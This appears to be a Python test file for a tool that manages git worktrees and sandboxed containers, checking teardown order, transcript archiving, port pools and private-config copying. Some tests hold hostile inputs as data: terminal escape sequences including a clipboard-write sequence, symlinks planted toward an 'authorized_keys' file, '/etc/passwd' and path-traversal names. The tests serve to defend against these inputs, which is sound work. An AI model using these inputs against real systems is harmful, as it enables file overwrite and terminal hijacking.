    wt = _box_made_checkout(fake_main, "old", "ref: refs/heads/.invalid\n")
    fake_main["state"]["listed_branch"][str(wt)] = "wt/old"
    monkeypatch.setattr("builtins.input", lambda *a: "y")
    assert worktree.add("old") == 0
    assert "(branch wt/old)" in capsys.readouterr().out


# ── remove: transcript-guarded teardown ─────────────────────────────────────────────


def _wt_remove_argv(calls):
    cmd = next(c for c in calls if "worktree" in c and "remove" in c)
    return cmd[cmd.index("worktree") :]


def _make_wt(fake_main, name="feat", registered=True):
    wt = fake_main["wt_root"] / name
    wt.mkdir(parents=True)
    (wt / ".git").write_text("")  # worktree marker
    if registered:  # git tracks it; registered=False fakes an orphan (metadata pruned)
        fake_main["state"]["registered"].add(str(wt))
    return wt


def test_remove_tears_down_then_git_remove(fake_main):
    wt = _make_wt(fake_main)
    posture = fake_main["state_dir"] / "worktrees" / "feat"
    vscode = fake_main["state_dir"] / "vscode" / "feat"
    legacy_vscode = fake_main["state_dir"] / "vscode" / "worktrees" / "feat"
    (posture / "nested").mkdir(parents=True)
    (posture / "nested" / "mode.json").write_text("{}")
    vscode.mkdir(parents=True)
    (vscode / "settings.json").write_text("{}")
    legacy_vscode.mkdir(parents=True)
    (legacy_vscode / "settings.json").write_text("{}")
    # No bound-out transcripts dir → the archive step no-ops (0) and removal proceeds.
    assert worktree.remove("feat", assume_yes=True) == 0
    # Box down BEFORE nuke (the box holds the mount), then its shadow volumes — all aimed at
    # the named worktree.
    assert fake_main["teardown"] == ["box:down:feat", "nuke:feat", "volumes:feat"]
    assert _wt_remove_argv(fake_main["calls"]) == ["worktree", "remove", "--force", str(wt)]
    assert not posture.exists()
    assert not vscode.exists()
    assert not legacy_vscode.exists()


def test_remove_prompts_and_aborts_on_no(fake_main, monkeypatch):
    _make_wt(fake_main)
    monkeypatch.setattr("builtins.input", lambda *a: "n")
    assert worktree.remove("feat") == 0  # declined → clean no-op
    assert fake_main["teardown"] == []  # nothing torn down
    assert not any("worktree" in c and "remove" in c for c in fake_main["calls"])


def test_remove_proceeds_on_yes(fake_main, monkeypatch):
    wt = _make_wt(fake_main)
    monkeypatch.setattr("builtins.input", lambda *a: "y")
    assert worktree.remove("feat") == 0
    assert fake_main["teardown"] == ["box:down:feat", "nuke:feat", "volumes:feat"]
    assert _wt_remove_argv(fake_main["calls"]) == ["worktree", "remove", "--force", str(wt)]


def test_remove_missing_worktree_errors(fake_main, capsys):
    assert worktree.remove("ghost", assume_yes=True) == 1
    assert "no worktree" in capsys.readouterr().err
    assert not any("worktree" in c and "remove" in c for c in fake_main["calls"])
    # No box/stack teardown — only the leftover-volume probe ran (and found nothing).
    assert fake_main["teardown"] == ["volumes:proj-ghost"]


def test_remove_aborts_when_archive_fails(fake_main, monkeypatch):
    from foldyard import transcripts

    _make_wt(fake_main)
    monkeypatch.setattr(transcripts, "sync_current", lambda *a, **k: 7)
    assert worktree.remove("feat", assume_yes=True) == 7  # archiving failed → refuse, kept
    assert not any("worktree" in c and "remove" in c for c in fake_main["calls"])


def test_remove_force_overrides_archive_failure(fake_main, monkeypatch):
    from foldyard import transcripts

    _make_wt(fake_main)
    monkeypatch.setattr(transcripts, "sync_current", lambda *a, **k: 7)
    # --force also skips the prompt (an explicit opt-in), like a destructive CLI should.
    assert worktree.remove("feat", force=True) == 0
    assert "--force" in _wt_remove_argv(fake_main["calls"])


def test_remove_archives_all_configured_agents_via_sync_current(fake_main, monkeypatch):
    from foldyard import transcripts

    wt = _make_wt(fake_main)
    seen = []
    monkeypatch.setattr(
        transcripts,
        "sync_current",
        lambda env, **kwargs: seen.append((env, kwargs)) or 0,
    )

    assert worktree.remove("feat", assume_yes=True) == 0
    assert seen == [
        (
            {"FOLDYARD_CHECKOUT": str(wt), "HERE": config.dev_vm_rel(), "WORKTREE": "feat"},
            {"what": "worktree 'feat' transcripts"},
        )
    ]


def test_remove_deletes_the_worktrees_from_box_slot_after_archiving_it(fake_main, monkeypatch):
    # ADR-0033: the checkout's deletion no longer takes the transcripts with it — they live in the
    # worktree's from-box slot, archived in step 3 and deleted with the rest of its local state.
    from foldyard import transcripts

    _make_wt(fake_main)
    slot = fake_main["state_dir"] / "from-box" / "worktrees" / "feat"
    (slot / "claude" / "projects").mkdir(parents=True)
    sibling = fake_main["state_dir"] / "from-box" / "worktrees" / "other"
    sibling.mkdir()
    order: list[str] = []
    monkeypatch.setattr(
        transcripts, "sync_current", lambda env, **kw: order.append(f"archive:{slot.exists()}") or 0
    )
    assert worktree.remove("feat", assume_yes=True) == 0
    assert order == ["archive:True"]  # archived while the slot was still there
    assert not slot.exists() and sibling.is_dir()


def test_remove_unlinks_a_planted_slot_link_without_following_it(fake_main, monkeypatch, tmp_path):
    from foldyard import transcripts

    _make_wt(fake_main)
    target = tmp_path / "precious"
    target.mkdir()
    (target / "keep").write_text("x")
    (fake_main["state_dir"] / "from-box" / "worktrees").mkdir(parents=True)
    (fake_main["state_dir"] / "from-box" / "worktrees" / "feat").symlink_to(target)
    monkeypatch.setattr(transcripts, "sync_current", lambda env, **kw: 0)
    assert worktree.remove("feat", assume_yes=True) == 0
    assert (target / "keep").read_text() == "x"
    assert not os.path.lexists(fake_main["state_dir"] / "from-box" / "worktrees" / "feat")


def test_a_leftover_slot_is_archived_before_it_is_deleted(fake_main, monkeypatch):
    from foldyard import transcripts

    slot = fake_main["state_dir"] / "from-box" / "worktrees" / "feat"
    (slot / "claude" / "projects").mkdir(parents=True)
    seen = []
    monkeypatch.setattr(transcripts, "sync_current", lambda env, **kw: seen.append(env) or 0)
    assert worktree.remove("feat", force=True) == 0
    assert seen and seen[0]["WORKTREE"] == "feat"
    assert not slot.exists()


def test_a_leftover_slot_that_failed_to_archive_is_kept(fake_main, monkeypatch, capsys):
    from foldyard import transcripts

    slot = fake_main["state_dir"] / "from-box" / "worktrees" / "feat"
    slot.mkdir(parents=True)
    monkeypatch.setattr(transcripts, "sync_current", lambda env, **kw: 23)
    assert worktree.remove("feat") == 23
    assert slot.is_dir()
    assert "NOT archived" in capsys.readouterr().err


def test_remove_retries_local_state_cleanup_when_checkout_gone(fake_main):
    # A prior remove got past `git worktree remove` but failed deleting local state (or the
    # tree went away out-of-band). Re-running must finish the cleanup, not error out with the
    # stale state stuck forever.
    posture = fake_main["state_dir"] / "worktrees" / "feat"
    posture.mkdir(parents=True)
    (posture / "dev-mode.json").write_text("{}")
    assert worktree.remove("feat", assume_yes=True) == 0
    assert not posture.exists()
    # No box/stack to tear down — a state pass plus the leftover-volume sweep, which must name
    # the project explicitly (the checkout is gone, so resolve() can't).
    assert fake_main["teardown"] == ["volumes:proj-feat"]
    assert not any("worktree" in c and "remove" in c for c in fake_main["calls"])


def test_remove_retries_volume_cleanup_when_checkout_and_state_gone(fake_main, monkeypatch):
    # The pre-fix leak: a fully-removed worktree (checkout + state gone) whose shadow volumes
    # survived, because teardown never dropped them. The retry must clean those on their own —
    # and still succeed rather than claim "no worktree named".
    monkeypatch.setattr(stack, "remove_devbox_volumes", lambda *a, **k: 6)
    assert worktree.remove("feat", assume_yes=True) == 0
    assert not any("worktree" in c and "remove" in c for c in fake_main["calls"])


def test_add_in_a_box_is_the_boxs_own(fake_main, monkeypatch):
    # The same verb, and nothing of your computer's: no registry, adoption or box.
    from foldyard import boxworktree

    seen = []
    monkeypatch.setattr(config, "in_box", lambda: True)
    monkeypatch.setattr(boxworktree, "add", lambda *a, **k: seen.append((a, k)) or 0)
    assert worktree.add("feat", "b", "main", box_up=False) == 0
    assert seen == [(("feat", "b", "main"), {"box_up": False})]
    assert not fake_main["calls"] and worktree_registry.checkouts(fake_main["main"]) == {}


def test_remove_in_box_points_nowhere_else(fake_main, monkeypatch, capsys):
    _make_wt(fake_main)
    monkeypatch.setattr(config, "in_box", lambda: True)
    assert worktree.remove("feat", force=True) == 1
    assert ".claude/worktrees" not in capsys.readouterr().err


def test_remove_refuses_in_box(fake_main, monkeypatch, capsys):
    # Same guard for remove: it tears down the worktree's box and stack, and drops its
    # registration and adopted config — all your computer's.
    _make_wt(fake_main)
    monkeypatch.setattr(config, "in_box", lambda: True)
    monkeypatch.setattr(worktree_published, "read", lambda main: frozenset({"feat"}))
    assert worktree.remove("feat", force=True) == 1
    assert fake_main["teardown"] == []  # nothing torn down
    assert "registered on your computer" in capsys.readouterr().err


def test_remove_orphaned_checkout_requires_force(fake_main, capsys):
    # ORPHAN: the checkout dir survives but git's worktree metadata is gone (e.g. pruned from
    # a context that couldn't see the dir) — `git worktree remove` refuses it forever, so
    # remove() explains and demands an explicit --force BEFORE tearing anything down.
    wt = _make_wt(fake_main, registered=False)
    assert worktree.remove("feat", assume_yes=True) == 1
    assert "ORPHANED" in capsys.readouterr().err
    assert wt.exists()  # nothing deleted without --force
    assert fake_main["teardown"] == []


def test_remove_orphaned_checkout_force_deletes_and_prunes(fake_main):
    # With --force the orphan is removed for real: normal box/stack/volume teardown, then the
    # dir is deleted directly (git can't remove an untracked tree) + `git worktree prune` so a
    # re-add of the same name starts clean, then local state goes as usual.
    wt = _make_wt(fake_main, registered=False)
    posture = fake_main["state_dir"] / "worktrees" / "feat"
    posture.mkdir(parents=True)
    (posture / "dev-mode.json").write_text("{}")
    assert worktree.remove("feat", force=True) == 0
    assert fake_main["teardown"] == ["box:down:feat", "nuke:feat", "volumes:feat"]
    assert not wt.exists()
    assert not any("worktree" in c and "remove" in c for c in fake_main["calls"])
    assert any(c[-2:] == ["worktree", "prune"] for c in fake_main["calls"])
    assert not posture.exists()


def test_remove_local_state_never_touches_the_legacy_root(fake_main, capsys):
    # The namespace collision: for a worktree named "worktrees", vscode/<name> IS the legacy
    # vscode root — cleanup must refuse it and leave OTHER worktrees' state alone.
    legacy_root = fake_main["state_dir"] / "vscode" / "worktrees"
    other = legacy_root / "other"
    other.mkdir(parents=True)
    (other / "settings.json").write_text("{}")
    assert worktree._remove_local_state("worktrees") is False
    assert other.exists()  # the sibling worktree's legacy state survived
    assert "refusing" in capsys.readouterr().err


def test_init_refuses_a_script_outside_the_repo(fake_main, monkeypatch, capsys):
    # The container sees only the mount, so an outside path couldn't resolve there anyway — but
    # failing here names the actual problem instead of a baffling in-container error.
    _init_hook(monkeypatch, fake_main["main"])
    monkeypatch.setattr(config, "worktree_init", lambda: "/etc/passwd")
    (fake_main["wt_root"] / "feat").mkdir(parents=True, exist_ok=True)
    assert worktree.init_config("feat") == 1
    assert "must point inside the repo" in capsys.readouterr().err
    assert not any(c[:2] == ["podman", "run"] for c in fake_main["calls"])


# ── uncommitted work, asked of the yard before the checkout is deleted ──────────────────────
#
# What the check and the parking commit DO is tests/test_worktree_remove.py's, against real git;
# here, only where they sit in the removal.


def test_remove_asks_the_yard_before_git_takes_the_checkout(fake_main, monkeypatch):
    # Ordering is the whole point: after `git worktree remove` there is nothing left to read.
    order: list[str] = []
    real_run = worktree.subprocess.run

    def spy(cmd, **kw):
        if cmd[:2] == ["podman", "run"]:
            order.append("yard")
        if cmd[:1] == ["git"] and "worktree" in cmd and "remove" in cmd:
            order.append("git-remove")
        return real_run(cmd, **kw)

    monkeypatch.setattr(worktree.subprocess, "run", spy)
    _make_wt(fake_main)
    assert worktree.remove("feat", assume_yes=True) == 0
    assert order == ["yard", "git-remove"]
    (check,) = fake_main["yard"]["checks"]
    assert check[check.index("-w") + 1] == str(fake_main["wt_root"] / "feat")


def test_remove_refuses_when_the_yard_cannot_answer(fake_main, capsys):
    # A net the operator relies on under --force is a promise now, so a check that fails keeps
    # the checkout (and says how to go on without it).
    _make_wt(fake_main)
    fake_main["yard"]["rc"] = 3
    assert worktree.remove("feat", force=True) == 1
    assert not any("worktree" in c and "remove" in c for c in fake_main["calls"])
    assert "--discard" in capsys.readouterr().err


def test_what_the_check_says_reaches_your_terminal_inert(fake_main, capsys):
    # The check runs git over the box-writable worktree (its filters, its config): what it says on
    # stderr is shown, as the failure line points at it, with its control sequences stripped.
    _make_wt(fake_main)
    fake_main["yard"].update(rc=3, err=b"\x1b]52;c;ZXZpbA==\x07\x1b[2K\xc2\x9bfatal: boom\n")
    assert worktree.remove("feat", force=True) == 1
    err = capsys.readouterr().err
    assert "]52;c;ZXZpbA==fatal: boom\n" in err
    assert "\x1b" not in err and "\x9b" not in err


def _nest(fake_main, wt, rel=".claude/worktrees/quick"):
    """A worktree an agent made inside ``wt`` from its box (docs/git.md, worktrees a box makes)."""
    inner = wt / rel
    inner.mkdir(parents=True)
    (inner / ".git").write_text("")
    fake_main["state"]["registered"].add(str(inner))
    return inner


@pytest.mark.parametrize("force", [False, True])
def test_remove_refuses_a_worktree_holding_another(fake_main, capsys, force):
    # `git worktree remove` deletes a worktree nested in an ignored dir, uncommitted edits and
    # all, without --force (checked against git 2.5x), and the yard's check reads only the outer
    # one. So nothing is torn down while one is inside, and --force (which saves only the outer
    # one's work) doesn't change that.
    inner = _nest(fake_main, _make_wt(fake_main))
    assert worktree.remove("feat", force=force, assume_yes=True) == 1
    assert fake_main["teardown"] == []
    assert fake_main["yard"]["checks"] == []
    assert not any("worktree" in c and "remove" in c for c in fake_main["calls"])
    err = capsys.readouterr().err
    assert str(inner) in err and "git worktree remove" in err and "--discard" in err


def test_remove_discard_takes_a_nested_worktree_too(fake_main, capsys):
    _nest(fake_main, _make_wt(fake_main))
    assert worktree.remove("feat", discard=True, assume_yes=True) == 0
    assert fake_main["teardown"]  # torn down as asked
    assert ".claude/worktrees/quick" in capsys.readouterr().out  # named in the plan


def test_a_sibling_sharing_the_prefix_is_not_nested(fake_main):
    _make_wt(fake_main)
    _make_wt(fake_main, "feat-2")
    assert worktree.remove("feat", assume_yes=True) == 0


def test_a_nested_path_is_shown_without_its_control_characters(fake_main, capsys):
    # The path comes from the shared .git, which a box writes.
    _nest(fake_main, _make_wt(fake_main), "q\x1b]52;c;evil\x07")
    assert worktree.remove("feat", assume_yes=True) == 1
    err = capsys.readouterr().err
    assert "\x1b" not in err and "\x07" not in err


def test_remove_refuses_when_git_cannot_list_worktrees(fake_main, capsys):
    # Can't tell whether one is inside, so nothing is torn down.
    _make_wt(fake_main)
    fake_main["state"]["list_rc"] = 128
    assert worktree.remove("feat", force=True, assume_yes=True) == 1
    assert fake_main["teardown"] == []
    assert "--discard" in capsys.readouterr().err


def test_remove_discard_goes_on_when_git_cannot_list_worktrees(fake_main):
    _make_wt(fake_main)
    fake_main["state"]["list_rc"] = 128
    assert worktree.remove("feat", discard=True, assume_yes=True) == 0


def test_remove_refuses_before_any_teardown_when_git_cannot_list_in_time_even_discarding(
    fake_main, capsys
):
    # A listing that times out is git blocked on main's records (a FIFO the box put there):
    # `git worktree remove` would block on the same, after the box and stack were gone.
    _make_wt(fake_main)
    fake_main["state"]["list_hangs"] = True
    assert worktree.remove("feat", discard=True, assume_yes=True) == 1
    assert fake_main["teardown"] == []
    err = capsys.readouterr().err
    assert "didn't answer" in err and "NOT removed" in err


def test_the_worktree_add_remove_and_prune_gits_are_bounded(fake_main, monkeypatch):
    timeouts: dict[str, object] = {}
    fake_run = worktree.subprocess.run

    def run(cmd, **kw):
        if cmd[:1] == ["git"] and "worktree" in cmd:
            verb = cmd[cmd.index("worktree") + 1]
            if verb in ("add", "remove", "prune"):
                timeouts[verb] = kw.get("timeout")
        return fake_run(cmd, **kw)

    monkeypatch.setattr(worktree.subprocess, "run", run)
    assert worktree.add("feat") == 0
    assert worktree.remove("feat", assume_yes=True) == 0
    _make_wt(fake_main, name="gone", registered=False)
    assert worktree.remove("gone", force=True) == 0
    assert timeouts == dict.fromkeys(("add", "remove", "prune"), worktree._WORKTREE_GIT_TIMEOUT)


def test_a_worktree_made_inside_during_the_teardown_is_not_deleted(fake_main, monkeypatch, capsys):
    # Its agents run until `box down`: one can make a worktree after the first look.
    wt = _make_wt(fake_main)
    from foldyard import box

    def down(cmd, *a, **k):
        fake_main["teardown"].append(f"box:{cmd}")
        if cmd == "down":
            _nest(fake_main, wt)
        return 0

    monkeypatch.setattr(box, "main", down)
    assert worktree.remove("feat", force=True, assume_yes=True) == 1
    assert not any("worktree" in c and "remove" in c for c in fake_main["calls"])
    assert (wt / ".claude" / "worktrees" / "quick").is_dir()
    err = capsys.readouterr().err
    assert "run this again" in err
    # By now the stack's and the box's volumes are gone: say what's left, not "nothing".
    assert "volumes dropped" in err and "nothing was deleted" not in err


@pytest.mark.parametrize("name", ["fe\nat", "feat "])
def test_an_outer_path_git_lists_verbatim_is_still_matched(fake_main, name):
    # Git doesn't escape a path in `worktree list --porcelain` (`-z` needs git 2.36): a newline
    # in it, or trailing whitespace, must neither make the worktree an orphan nor hide what's
    # inside it.
    wt = _make_wt(fake_main, name)
    assert worktree._registered_worktree(fake_main["main"], wt)
    inner = _nest(fake_main, wt)
    assert worktree._nested_worktrees(fake_main["main"], wt) == [str(inner)]
    assert worktree.remove(name, force=True, assume_yes=True) == 1
    assert fake_main["teardown"] == []


def test_the_git_calls_that_can_run_repo_code_switch_hooks_off(fake_main):
    # `worktree add` records the worktree (post-checkout, reference-transaction); `remove` deletes
    # it (and parks work on a ref: reference-transaction); `prune` for symmetry. Each through the
    # one hookless helper — see
    # tests/test_worktree_git_hooks.py for what that does against a real git.
    def hookless(cmd):
        return "core.hooksPath=/dev/null" in cmd and "core.fsmonitor=" in cmd

    assert worktree.add("feat") == 0
    assert hookless(next(c for c in fake_main["calls"] if "worktree" in c and "add" in c))
    assert worktree.remove("feat", assume_yes=True) == 0
    assert hookless(next(c for c in fake_main["calls"] if "worktree" in c and "remove" in c))
    _make_wt(fake_main, name="gone", registered=False)
    assert worktree.remove("gone", force=True) == 0
    assert hookless(next(c for c in fake_main["calls"] if c[-2:] == ["worktree", "prune"]))


# ── a [ports] pool (tests/test_port_pools.py has the allocation) ─────────────────────────────


@pytest.fixture
def pooled(fake_main, monkeypatch):
    """main's config pools APP_PORT over 3001-3003; every worktree's band is far from it."""
    monkeypatch.setattr(config, "port_bases", lambda: {"APP_PORT": 3000})
    monkeypatch.setattr(config, "port_pools", lambda: {"APP_PORT": range(3001, 3004)})
    monkeypatch.setattr(config, "port_pool_problems", lambda: [])
    monkeypatch.setattr(stack, "_hashed_offset", lambda name: 50)  # recorded 50, 51, … in turn
    return fake_main


def test_add_gives_the_worktree_the_lowest_free_pooled_port(pooled, capsys):
    assert worktree.add("feat") == 0
    assert worktree_registry.recorded_ports(pooled["main"]) == {"feat": {"APP_PORT": 3001}}
    assert "APP_PORT 3001" in capsys.readouterr().out


def test_add_refuses_a_full_pool_before_anything_is_made(pooled, monkeypatch, capsys):
    for name in ("a", "b", "c"):
        assert worktree.add(name) == 0
    pooled["calls"].clear()
    ensured = []
    monkeypatch.setattr(machine, "ensure", lambda *a, **k: ensured.append(a))
    capsys.readouterr()
    assert worktree.add("d") == 1
    assert not any("worktree" in c and "add" in c for c in pooled["calls"]) and not ensured
    assert not (pooled["wt_root"] / "d").exists()
    err = capsys.readouterr().err
    assert "3001 (a)" in err and "3003 (c)" in err and "fy worktree remove" in err


def test_add_refuses_a_pool_that_is_misconfigured(pooled, monkeypatch, capsys):
    monkeypatch.setattr(config, "port_pool_problems", lambda: ["APP_PORT: the pool is backwards"])
    assert worktree.add("feat") == 1
    assert not any("worktree" in c and "add" in c for c in pooled["calls"])
    assert "the pool is backwards" in capsys.readouterr().err


def test_add_again_gives_a_worktree_from_before_the_pool_a_pooled_port(pooled, capsys):
    # The upgrade path: a worktree registered before the pool publishes on its band until asked.
    wt = _make_wt(pooled, "old")
    worktree_registry.register(pooled["main"], "old", wt)
    assert worktree.add("old") == 0
    assert worktree_registry.recorded_ports(pooled["main"]) == {"old": {"APP_PORT": 3001}}
    out = capsys.readouterr().out
    assert "APP_PORT 3050 → 3001" in out and "fy box recreate" in out


def test_add_again_refuses_a_pool_that_is_misconfigured(pooled, monkeypatch, capsys):
    wt = _make_wt(pooled, "old")
    worktree_registry.register(pooled["main"], "old", wt)
    monkeypatch.setattr(config, "port_pools", lambda: {})
    monkeypatch.setattr(config, "port_pool_problems", lambda: ["APP_PORT: the pool is backwards"])
    assert worktree.add("old") == 1
    assert "the pool is backwards" in capsys.readouterr().err


# ── a private setup: the worktree's config is main's adopted copy (ADR-0037) ──────────────
#
# Untracked, the private files don't come with `git worktree add`. Your computer writes them from
# main's ADOPTED copy (what you reviewed, never main's tree, which the box can write), through
# mountwrite (never through a link the box planted), and the bundled skill beside them.

PRIVATE = '[project]\nname = "acme"\nprivate = true\n\n[proxy]\npassthrough = ["trusted.example"]\n'


def test_a_private_worktree_gets_mains_adopted_config_and_is_adopted_without_asking(
    fake_main, monkeypatch, capsys
):
    _adopt_main(fake_main, PRIVATE)
    (fake_main["main"] / "foldyard.toml").write_text(EDITED)  # main's tree, edited since
    _no_prompt(monkeypatch)
    assert worktree.add("feat") == 0
    wt = fake_main["wt_root"] / "feat"
    assert (wt / "foldyard.toml").read_text() == PRIVATE
    assert (wt / ".claude" / "skills" / "foldyard" / "SKILL.md").is_file()
    assert _wt_adopted("feat")
    assert "adopted — identical to main's" in capsys.readouterr().out


def test_a_private_worktree_is_written_by_your_computer_not_a_script(fake_main, monkeypatch):
    _adopt_main(fake_main, PRIVATE)
    assert worktree.add("feat") == 0
    assert not any(c[:2] == ["podman", "run"] and "sh" in c for c in fake_main["calls"])


def test_refreshing_a_private_worktree_replaces_a_planted_link_never_writes_through_it(
    fake_main, tmp_path
):
    _adopt_main(fake_main, PRIVATE)
    assert worktree.add("feat") == 0
    wt = fake_main["wt_root"] / "feat"
    target = tmp_path / "authorized_keys"
    target.write_text("mine\n")
    (wt / "foldyard.toml").unlink()
    (wt / "foldyard.toml").symlink_to(target)  # the box can write the worktree
    assert worktree.init_config("feat") == 0
    assert target.read_text() == "mine\n"
    assert not (wt / "foldyard.toml").is_symlink()
    assert (wt / "foldyard.toml").read_text() == PRIVATE


def test_a_private_worktree_waits_for_main_to_be_adopted(fake_main, capsys):
    (fake_main["main"] / "foldyard.toml").write_text(PRIVATE)  # private, but never adopted
    assert worktree.add("feat") == 0
    assert not (fake_main["wt_root"] / "feat" / ".claude" / "skills" / "foldyard").exists()
    out = capsys.readouterr()
    assert "fy config adopt" in out.out + out.err


@pytest.mark.parametrize("name", ["..", ".", "", "a/b", "../elsewhere", "/etc"])
def test_init_takes_only_a_worktrees_name(fake_main, tmp_path, capsys, name):
    # It writes main's config into <worktrees root>/<name>: never anywhere a path would lead.
    _adopt_main(fake_main, PRIVATE)
    for d in (fake_main["wt_root"] / "a" / "b", tmp_path / "elsewhere"):
        d.mkdir(parents=True)
    assert worktree.init_config(name) == 1
    assert "single" in capsys.readouterr().err
    assert not list(tmp_path.glob("*/.claude")) and not (tmp_path / "foldyard.toml").exists()
    assert not (fake_main["wt_root"] / "a" / "b" / "foldyard.toml").exists()


def test_registering_an_existing_worktree_gives_it_the_private_files_it_lacks(fake_main):
    _adopt_main(fake_main, PRIVATE)
    wt = _existing_git_worktree(fake_main, "old")
    assert worktree.add("old", assume_yes=True) == 0
    assert (wt / "foldyard.toml").read_text() == PRIVATE


def test_registering_never_overwrites_a_config_already_there(fake_main, capsys):
    _adopt_main(fake_main, PRIVATE)
    wt = _existing_git_worktree(fake_main, "old")
    (wt / "foldyard.toml").write_text("# mine\n")
    assert worktree.add("old", assume_yes=True) == 0
    assert (wt / "foldyard.toml").read_text() == "# mine\n"
    assert "fy worktree init old" in capsys.readouterr().out


def test_an_ordinary_worktree_gets_no_private_copy(fake_main):
    _adopt_main(fake_main)
    assert worktree.add("feat") == 0
    assert not (fake_main["wt_root"] / "feat" / ".claude" / "skills" / "foldyard").exists()


def test_a_private_copy_never_writes_through_a_worktree_dir_the_box_replaced(fake_main, tmp_path):
    # The worktrees root is mounted into the VM: the box can swap a worktree's own directory for a
    # link to one of yours, and your computer must not write the copy there.
    _adopt_main(fake_main, PRIVATE)
    assert worktree.add("feat") == 0
    wt = fake_main["wt_root"] / "feat"
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    import shutil

    shutil.rmtree(wt)
    wt.symlink_to(elsewhere)
    worktree.init_config("feat")
    assert list(elsewhere.iterdir()) == []


def test_add_reviews_a_config_main_adopted_before_it_had_to_parse(fake_main, monkeypatch, capsys):
    """Main's adopted copy predates the refusal of a file that doesn't parse, and the branch's is
    the same bytes: adopting it on main's say-so is refused, and the review explains why rather
    than the add reporting it couldn't offer the config at all."""
    from foldyard import configpin

    with monkeypatch.context() as m:
        m.setattr(configpin, "_refuse_unparseable", lambda *_a: None)
        _adopt_main(fake_main, "# team \x01\n" + TOML)

    assert worktree.add("feat") == 0
    assert not _wt_adopted("feat")
    err = capsys.readouterr().err
    assert "doesn't parse" in err
    assert "couldn't offer" not in err
